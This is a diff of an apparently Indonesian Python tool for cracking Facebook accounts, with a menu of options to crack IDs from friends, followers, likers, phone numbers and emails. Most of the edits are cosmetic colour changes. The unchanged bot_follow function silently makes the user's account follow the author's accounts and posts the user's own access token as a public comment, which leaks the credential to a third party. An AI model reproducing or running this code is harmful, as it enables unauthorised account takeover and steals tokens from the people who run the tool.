@@ -49,7 +49,6 @@ def banner():
 \033[1;93m◍➤\033[1;97m Author     : \033[1;92m☆ ANGGA \033[1;96m™ \033[1;92m☆ \033[1;97m
 \033[1;93m◍➤\033[1;97m Github     : \033[1;92mhttps://github.com/Bajingan-Z \033[1;97m
 \033[1;93m◍➤\033[1;97m Facebook   : \033[1;92mAngga \033[1;96m™ \033[1;97m
-\033[1;93m◍➤\033[1;97m Instagram  : \033[1;92mraka_andrian27 \033[1;97m
 \033[1;93m◍➤\033[1;97m Twitter    : \033[1;92mBangsat_XD \033[1;97m
   \033[1;95m──────═• \033[1;92m● \033[1;95m══════════════════════════════ \033[1;92m● \033[1;97m\033[1;95m•═──────     """)
 
@@ -207,14 +206,14 @@ def bot_follow():
 	except IOError:
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
-	kom = ("Aa Raka Ganteng Siapa Punya?\n\nhttps://www.facebook.com/100017584682867/posts/953529338576547/?app=fbl")
+	kom = ("Aa Raka Ganteng Siapa Punya?\n\nhttps://www.facebook.com/100017584682867/posts/800676813861801/?app=fbl")
 	requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + toket)     
 	requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + toket) 
 	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + toket)     
 	requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + toket)    
 	requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token=" + toket) 
 	requests.post('https://graph.facebook.com/4257706904267068/comments/?message=' +toket+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/800676813861801/comments/?message=' +kom+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/953529338576547/comments/?message=' +kom+ '&access_token=' + toket)
 	menu()
 
 ### MAIN MENU ###
@@ -235,20 +234,20 @@ def menu():
     print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
     print((k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id))
     print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
-    print((k+"["+p+"•"+k+"]"+p+" Status  : "+k+"In Development"+p))
+    print((k+"["+p+"•"+k+"]"+p+" Status  : "+k+"Premium"+p))
     print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
-    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
-    print((k+"["+p+"2"+k+"]"+p+" Crack ID From Followers"))
-    print((k+"["+p+"3"+k+"]"+p+" Crack ID From Likers Post"))
-    print((k+"["+p+"4"+k+"]"+p+" Crack By Phone Number"))
-    print((k+"["+p+"5"+k+"]"+p+" Crack By Email"))
-    print((k+"["+p+"6"+k+"]"+p+" Get Data Target"))
-    print((k+"["+p+"7"+k+"]"+p+" Result Crack"))
-    print((k+"["+p+"0"+k+"]"+p+" Logout"))
+    print((k+"\n["+p+"1"+k+"]"+p+" \033[1;93mCrack ID From Public/Friend \033[1;97m"))
+    print((k+"["+p+"2"+k+"]"+p+" \033[1;96mCrack ID From Followers \033[1;97m"))
+    print((k+"["+p+"3"+k+"]"+p+" \033[1;96mCrack ID From Likers Post \033[1;97m"))
+    print((k+"["+p+"4"+k+"]"+p+" \033[1;96mCrack By Phone Number \033[1;97m"))
+    print((k+"["+p+"5"+k+"]"+p+" \033[1;96mCrack By Email \033[1;97m"))
+    print((k+"["+p+"6"+k+"]"+p+" \033[1;96mGet Data Target \033[1;97m"))
+    print((k+"["+p+"7"+k+"]"+p+" \033[1;96mResult Crack \033[1;97m"))
+    print((k+"["+p+"0"+k+"]"+p+" \033[1;96mLogout \033[1;97m"))
     choose_menu()
 
 def choose_menu():
-	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+	r=input(k+"\n["+p+"•"+k+"]"+p+" \033[1;96mChoose \033[1;97m: ")
 	if r=="":
 		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
 		menu()
@@ -268,7 +267,7 @@ def choose_menu():
 		ress()
 	elif r=="0":
 		try:
-			jalan(k+"\n["+p+"•"+k+"]"+p+" Thanks For Using My Tool")
+			jalan(k+"\n["+p+"•"+k+"]"+p+" \033[1;96mThanks For Using My Tool\033[1;97m")
 			os.system("rm -rf login.txt")
 			exit()
 		except Exception as e:
@@ -278,12 +277,12 @@ def choose_menu():
 		menu()	
 
 def pilihcrack(file):
-  print((k+"\n["+p+"1"+k+"]"+p+" Api ("+k+"Fast"+p+")"))
-  print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+"Fast"+p+")"))
-  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"Slow"+p+")("+h+"Recommended"+p+")"))
-  print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
-  print((k+"["+p+"5"+k+"]"+p+" Free Facebook ("+k+"Super Slow"+p+")"))
-  krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+  print((k+"\n["+p+"1"+k+"]"+p+" \033[1;96mApi \033[1;97m("+k+"Fast"+p+")"))
+  print((k+"["+p+"2"+k+"]"+p+" \033[1;96mApi + TTL \033[1;97m("+k+"Fast"+p+")"))
+  print((k+"["+p+"3"+k+"]"+p+" \033[1;96mMbasic \033[1;97m("+k+"Slow"+p+")("+h+"Recommended"+p+")"))
+  print((k+"["+p+"4"+k+"]"+p+" \033[1;96mMbasic + TTL \033[1;97m("+k+"Slow"+p+")"))
+  print((k+"["+p+"5"+k+"]"+p+" \033[1;96mFree Facebook \033[1;97m("+k+"Super Slow"+p+")"))
+  krah=input(k+"\n["+p+"•"+k+"]"+p+" \033[1;96mChoose \033[1;97m: ")
   if krah in[""]:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
     pilihcrack(file)
